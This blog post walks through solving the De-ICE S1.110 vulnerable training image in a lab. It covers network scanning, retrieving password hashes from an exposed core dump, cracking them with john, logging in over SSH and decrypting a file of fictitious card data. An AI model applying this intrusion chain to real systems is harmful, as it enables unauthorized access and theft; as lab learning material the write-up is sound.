---
layout: post
title: Solving De-ICE S1.110
date: '2017-09-09 18:12:00'
tags:
- linux
redirect_from: /solving-de-ice-s1-110
---

The [De-ICE S1.110](https://www.vulnhub.com/entry/de-ice-s1110,9/) is an entry-level vulnerable live CD image, meant for learning the very basics of penetration testing. I, being an absolute beginner in such, decided to tackle the challenge. I started with the [De-ICE S1.100](https://www.vulnhub.com/entry/de-ice_s1100-level-1,8/) image, but ended up following a bunch of guides because of some weird OpenSSL decryption issues. However, this one I actually solved all by myself, applying the knowledge I gained from before. Here goes:

## The environment

I set up a local restricted "lab"-environment in VMware Workstation, that contains a 64-bit Kali Linux VM, and of course, the vulnerable live CD image running in a small VM. The host-only network contains VMware's DHCP-server so Kali can get itself an address, but the live CD is configured to have a static IP (`192.168.1.110`) out of the box.

## Starting off as usual

Let's pretend for a moment that I don't already know what address the target is behind, but I do know I am in the same network as it.

    root@kali:~# ip a
    ...
        inet 192.168.1.3/24
    ...

To try and find the target, I'll use `netdiscover`. `netdiscover` is a tool that scans a given network range with ARP, so scanning the `/24` network I'm in should take no time at all.

    root@kali:~# netdiscover -r 192.168.1.0/24
     Currently scanning: Finished! | Screen View: Unique Hosts
    
     2 Captured ARP Req/Rep packets, from 2 hosts. Total size: 120
     
     _____________________________________________________________________________
       IP At MAC Address Count Len MAC Vendor / Hostname
     -----------------------------------------------------------------------------
     192.168.1.110 00:0c:29:a5:eb:3b 1 60 Unknown vendor
    
     192.168.1.254 00:50:56:f3:47:84 1 60 Unknown vendor

Found it. `.254` is VMware's DHCP-server, so `.110` must be the target. The next step is to find out what services are on the target, and what ports they listen to. This is where `nmap` comes in.

    root@kali:~# nmap -A -T4 192.168.1.110
    
    Starting Nmap 7.40 ( https://nmap.org ) at 2017-09-09 01:17 EEST
    Nmap scan report for 192.168.1.110
    Host is up (0.00011s latency).
    Not shown: 996 closed ports
    PORT STATE SERVICE VERSION
    21/tcp open ftp vsftpd 2.0.4
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | drwxr-xr-x 7 1000 513 180 Sep 09 00:48 download
    |_drwxrwxrwx 2 0 0 60 Feb 26 2007 incoming [NSE: writeable]
    22/tcp open tcpwrapped
    |_sshv1: Server supports SSHv1
    80/tcp open http Apache httpd 2.2.4 ((Unix) mod_ssl/2.2.4 OpenSSL/0.9.8b DAV/2)
    | http-methods:
    |_ Potentially risky methods: TRACE
    |_http-server-header: Apache/2.2.4 (Unix) mod_ssl/2.2.4 OpenSSL/0.9.8b DAV/2
    |_http-title: Site doesn't have a title (text/html).
    631/tcp open ipp CUPS 1.1
    | http-methods:
    |_ Potentially risky methods: PUT
    |_http-server-header: CUPS/1.1
    |_http-title: 403 Forbidden
    MAC Address: 00:0C:29:A5:EB:3B (VMware)
    Device type: general purpose
    Running: Linux 2.6.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6
    OS details: Linux 2.6.13 - 2.6.32
    Network Distance: 1 hop
    Service Info: OS: Unix
    
    TRACEROUTE
    HOP RTT ADDRESS
    1 0.11 ms 192.168.1.110

The options passed to `nmap` enable OS and service detection (`-A`), and faster execution (`-T4`). `nmap` finished after about a minute and gave out a plethora of information:

- There's an FTP server that allows for anonymous login. At its root, there are two directories: `download` and `incoming`. I'll be taking a look at these soon.
- SSH is at its standard port 22.
- Apache is hosting a site over HTTP. It also has OpenSSL enabled: this might be useful.

## What's there on the website

Navigating over to `http://192.182.1.110` gives the info page for the live CD. There's a link to the game-related web pages, it's really hard to miss. At the top, there's a link to some hints on cracking the live CD, if you're stuck.

Over at the game-related web page, it talks of being an FTP server for the network team; this is a continuation from the previous live CD (S1.100). The site has a list of some system administrators, with their names and respective email addresses. I'm going to go ahead and guess that these names are valid logins for the target. Simply iterating the names by hand provides the following username candidates:

    adamsa
    aadams
    adams
    banterb
    bbanter
    banter
    coffeec
    ccoffee
    coffee

Having just recently compromised the previous target, these guys most likely have realised to _not_ use their names as their passwords. At this point, I could run `hydra` over these names and a wordlist, but that takes time and it's boring to just stare at a blinking terminal cursor. But hey, there's the FTP server.

## What are these files anyway?

Simply navigating to `ftp://192.168.1.110` gives a nice graphical browser for the FTP-server. The `incoming` directory is empty, but `download` is full of goodies. At first glance, it seems to contain various common files and directories used to configure servers - sounds like something the web page talked about before. The superuser's home doesn't contain anything interesting, neither does `var`. However, there's a file called `shadow` under `/etc`. Huh.

I must admit, at this point I chuckled a bit, thinking some fool has left user password hashes just laying around in an anonymous FTP server. But, the file only contains a hash for `root`, and nothing else. No mentions of the users I previously found. Just for good measure, I grabbed the hash, stuffed it into a file called `roothash` and ran `john` on it.

## Can't be that easy, now can it

`john` (the Ripper) is a tool that cracks hashed passwords, such as the ones in `shadow`. Telling it to run in the `-single` mode will crack only the most weakest passwords, but it's still something.

Something it sure is. This hash is for the password `toor`. Pinnacle of security over here. There's just no way this is the actual password for root on the target. Even if it was, I won't even bother trying to log in to root over SSH - no way it's deliberately configured to allow root login.

I'll try something else.

## Someone did forget something just laying around

Still looking over `/etc`, a file called `core` pops out. This is a binary file, a coredump most likely. I can't process it in a browser, so I have to get it to my machine. I'll download it with `wget`:

    root@kali:~# wget ftp://192.168.1.110/download/etc/core
    --2017-09-09 01:53:57-- ftp://192.168.1.110/download/etc/core
               => ‘core’
    Connecting to 192.168.1.110:21... connected.
    Logging in as anonymous ... Logged in!
    ==> SYST ... done. ==> PWD ... done.
    ==> TYPE I ... done. ==> CWD (1) /download/etc ... done.
    ==> SIZE core ... 362436
    ==> PASV ... done. ==> RETR core ... done.
    Length: 362436 (354K) (unauthoritative)
    
    core 100%[============================================================================>] 353,94K --.-KB/s in 0,001s  
    
    2017-09-09 01:53:57 (275 MB/s) - ‘core’ saved [362436]

`file` confirms my suspicions; it sure is a coredump file:

    root@kali:~# file core
    core: ELF 32-bit LSB core file Intel 80386, version 1 (SYSV)

I'm not too familiar with analysing coredumps, so I'll just resort to searching for any leftover `strings`.

    root@kali:~# strings core
    ...
    .dynamic
    .useless
    root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::bin:*:9797:0:::::daemon:*:9797:0:::::adm:*:9797:0:::::lp:*:9797:0:::::sync:*:9797:0:::::shutdown:*:9797:0:::::halt:*:9797:0:::::mail:*:9797:0:::::news:*:9797:0:::::uucp:*:9797:0:::::operator:*:9797:0:::::games:*:9797:0:::::ftp:*:9797:0:::::smmsp:*:9797:0:::::mysql:*:9797:0:::::rpc:*:9797:0:::::sshd:*:9797:0:::::gdm:*:9797:0:::::pop:*:9797:0:::::nobody:*:9797:0:::::aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::

Now hold on just a moment. Do I see a `shadow` there, with the users I previously found? Quickly formatting the string yields the following:

    root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::
    bin:*:9797:0:::::
    daemon:*:9797:0:::::a
    dm:*:9797:0:::::
    lp:*:9797:0:::::
    sync:*:9797:0:::::
    shutdown:*:9797:0:::::
    halt:*:9797:0:::::
    mail:*:9797:0:::::
    news:*:9797:0:::::
    uucp:*:9797:0:::::
    operator:*:9797:0:::::
    games:*:9797:0:::::
    ftp:*:9797:0:::::
    smmsp:*:9797:0:::::
    mysql:*:9797:0:::::
    rpc:*:9797:0:::::
    sshd:*:9797:0:::::
    gdm:*:9797:0:::::
    pop:*:9797:0:::::
    nobody:*:9797:0:::::
    aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::
    bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::
    ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::

## Let's do some bruteforcing

I'll store the hashes in a file called `hashes` and run `john` on it. Just `-single` yields no results, which is quite expected. It's time to bring out the big guns: `-rules`, `-wordlist` and `-fork`.

    root@kali:~# john -rules -wordlist=/usr/share/wordlists/rockyou.txt -fork=8 hashes

`-wordlist` defines a list of words to try as passwords, and `-rules` enables multiple mutation rules that are applied to each password. Kali comes packed with the "rockyou"-wordlist, that contains around 14.3 million commonly used passwords. This list combined with the default ruleset for john creates a massive amount of password candidates to go through. To ease this process, I'll tell `john` to use eight processes, with `-fork=8`, to go through the passwords. (Eight, because that's how many cores my Kali VM has available). Hitting almost any key while `john` is running will print its status:

    1 0g 0:00:00:07 0.01% (ETA: 2017-09-10 15:03) 0g/s 6515p/s 26067c/s 26067C/s purrfect..poppa1
    5 0g 0:00:00:07 7.03% (ETA: 02:10:28) 0g/s 6593p/s 26378c/s 26378C/s fadhli1..estevez1
    7 0g 0:00:00:07 10.56% (ETA: 02:09:55) 0g/s 6935p/s 27745c/s 27745C/s eillomeillom..edwoodedwood
    8 0g 0:00:00:07 12.29% (ETA: 02:09:45) 0g/s 6281p/s 25127c/s 25127C/s htehpaj..yemaj
    3 0g 0:00:00:07 3.52% (ETA: 02:12:08) 0g/s 6604p/s 26422c/s 26422C/s Dancer91..Dafydd
    6 0g 0:00:00:07 8.78% (ETA: 02:10:08) 0g/s 6515p/s 26061c/s 26061C/s Mybike1..Muhamed1
    4 0g 0:00:00:07 5.27% (ETA: 02:11:01) 0g/s 6273p/s 25100c/s 25100C/s mamadoras..mahpahs
    2 0g 0:00:00:07 1.87% (ETA: 02:15:03) 0g/s 6255p/s 25025c/s 25025C/s janeiro..jammin

About 30 seconds worth of increasing my room's ambient temperature, `john` has found two passwords:

    root@kali:~# john -show hashes
    root:Complexity:13574:0:::::
    bbanter:Zymurgy:13571:0:99999:7:::

Our beloved intern Bob from before did come up with a better password than just `bbanter`, but it still succumbed to the bruteforce. I also have a password for root (!).

## Get in and find something tasty

Now that I have a user and a password for it, I can log in through SSH.

    root@kali:~# ssh bbanter@192.168.1.110
    bbanter@192.168.1.110's password:
    Linux 2.6.16.
    bbanter@slax:~$

I'm not interested in this user; I'll head straight for `root`.

    bbanter@slax:~$ su
    Password: **********
    root@slax:/home/bbanter#

This being an FTP-server, I'm guessing the good stuff is over at the `ftp` user's home directory. However, it just contains the stuff that's already available through the anonymous FTP server. Let's check the other users:

    root@slax:/home# ls -a
    . .. aadams bbanter	ccoffee ftp root

What's this? root has a directory for itself over at `/home`?

    root@slax:/home/root# ls -a
    . .. .save .screenrc

There's a directory called `.save`, I wonder what's inside.

    root@slax:/home/root/.save# ls
    copy.sh customer_account.csv.enc

Seems like I found something tasty.

## OpenSSL decryption

There's two files here: a shell script called `copy.sh` and an allegedly encrypted CSV-file of customer accounts. I'll take a look at the script first:

    root@slax:/home/root/.save# cat copy.sh 
    #!/bin/sh
    #encrypt files in ftp/incoming
    openssl enc -aes-256-cbc -salt -in /home/ftp/incoming/$1 -out /home/root/.save/$1.enc -pass file:/etc/ssl/certs/pw
    #remove old file
    rm /home/ftp/incoming/$1

The script, as it says in the comments, encrypts files in `/home/ftp/incoming`, encrypts them and stores them in this `.save` directory. Afterwards, it removes the original, which is why `incoming` was empty. What matters here is the encryption:

- It's done with OpenSSL's symmetric encryption suite
- It uses AES-256-CBC as a cipher
- It uses a password stored in `/etc/ssl/certs/pw`

Because of this, I can decrypt this file in-place, right here, right now.

    root@slax:/home/root/.save# openssl enc -d -aes-256-cbc -in customer_account.csv.enc -pass file:/etc/ssl/certs/pw
    "CustomerID","CustomerName","CCType","AccountNo","ExpDate","DelMethod"
    1002,"Mozart Exercise Balls Corp.","VISA","2412225132153211","11/09","SHIP"
    1003,"Brahms 4-Hands Pianos","MC","3513151542522415","07/08","SHIP"
    1004,"Strauss Blue River Drinks","MC","2514351522413214","02/08","PICKUP"
    1005,"Beethoven Hearing-Aid Corp.","VISA","5126391235199246","09/09","SHIP"
    1006,"Mendelssohn Wedding Dresses","MC","6147032541326464","01/10","PICKUP"
    1007,"Tchaikovsky Nut Importer and Supplies","VISA","4123214145321524","05/08","SHIP"

And there it is; sensitive customer records that contain credit card information. "No Security Corp." living up to its name.

<!--kg-card-end: markdown-->